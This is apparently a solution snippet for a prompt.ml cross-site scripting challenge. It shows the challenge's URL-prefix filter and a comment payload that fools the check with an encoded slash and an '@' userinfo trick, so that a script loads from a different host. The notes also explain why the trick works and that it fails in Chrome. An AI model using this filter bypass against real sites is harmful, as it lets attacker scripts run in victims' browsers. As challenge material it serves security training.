// payload http://prompt.ml%2f@localhost:8000/

function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}

// %2f pass decodeURIComponent
// @ magic: embedded credentials in subresource requests

// BTW: not work for chrome and chromium
// https://www.chromestatus.com/feature/5669008342777856